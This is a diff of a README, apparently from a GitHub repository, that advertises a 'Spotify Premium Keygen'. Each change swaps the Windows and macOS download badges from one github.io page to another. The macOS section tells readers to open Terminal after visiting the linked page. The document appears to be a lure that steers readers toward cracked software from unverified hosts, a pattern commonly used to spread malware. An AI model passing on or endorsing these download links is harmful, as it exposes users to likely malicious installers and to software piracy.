@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Spotify+Premium_Keygen-1DB954?style=for-the-badge&logo=spotify)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Spotify+Premium_Keygen-1DB954?style=for-the-badge&logo=spotify)](https://beatowlrouse.github.io/windownload/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Spotify+Premium_Keygen-1DB954?style=for-the-badge&logo=spotify)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Spotify+Premium_Keygen-1DB954?style=for-the-badge&logo=spotify)](https://beatowlrouse.github.io/windownload/)
 
 </div>
 
@@ -105,7 +105,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → Terminal → Enter)
@@ -128,7 +128,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Spotify+Premium_Keygen-1DB954?style=for-the-badge&logo=spotify)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/⬇_Download_Spotify+Premium_Keygen-1DB954?style=for-the-badge&logo=spotify)](https://beatowlrouse.github.io/windownload/)
 
 </div>
 
